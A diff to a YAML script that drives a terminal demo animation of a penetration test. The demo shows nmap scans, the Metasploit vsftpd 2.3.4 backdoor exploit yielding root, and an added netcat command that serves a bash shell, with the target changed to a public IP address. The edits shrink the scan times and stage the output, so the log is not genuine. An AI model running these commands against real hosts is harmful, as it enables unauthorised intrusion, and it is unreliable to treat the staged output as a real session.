@@ -12,6 +12,8 @@
 - type: char
   value: nmap -sT -p- -Pn $target
   prefix: default
+- type: pause
+  value: 2000
 - type: line
   value: |
     Nmap scan report for $target
@@ -63,6 +65,8 @@
 - type: char
   value: nmap --script banner $target
   prefix: default
+- type: pause
+  value: 2000
 - type: line
   value: |
     Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-28 19:59 GMT
@@ -107,12 +111,14 @@
     8180/tcp open  unknown
     MAC Address: 00:15:5D:29:81:0C (Microsoft)
 
-    Nmap done: 1 IP address (1 host up) scanned in 29.80 seconds
+    Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds
 - type: linebreak
   prefix: default
 - type: char
   value: nmap --script vuln $target
   prefix: default
+- type: pause
+  value: 2000
 - type: line
   value: |
     Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-28 19:59 GMT
@@ -795,7 +801,7 @@
     |_smb-vuln-ms17-010: ERROR: Script execution failed (use -d to debug)
     |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
 
-    Nmap done: 1 IP address (1 host up) scanned in 562.40 seconds
+    Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds
 
 - type: linebreak
   prefix: default
@@ -905,7 +911,25 @@
   value: set RHOSTS $target
   prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
 - type: block
-  value: target => 192.168.10.11
+  value: target => 52.73.153.209
 - type: char
   value: exploit
   prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
+- type: linebreak
+- type: line
+  value: |
+    [*] 52.73.153.209:21 - Banner: 220 (vsFTPd 2.3.4)
+    [*] 52.73.153.209:21 - USER: 331 Please specify the password.
+    [+] 52.73.153.209:21 - Backdoor service has been spawned, handling...
+    [+] 52.73.153.209:21 - UID: uid=0(root) gid=0(root)
+    [*] Found shell.
+    [*] Command shell session 1 opened (0.0.0.0:0 -> 52.73.153.209:6200) at 2021-03-01 12:28:28 -0500
+- type: linebreak
+- type: char
+  value: nc -nvlp 5555 -e /bin/bash
+- type: block
+  value: listening on [any] 5555 ...
+- type: pause
+  value: 2000
+- type: block
+  value: connect to [52.73.153.209] from (UNKNOWN) [42.120.10.5] 52242
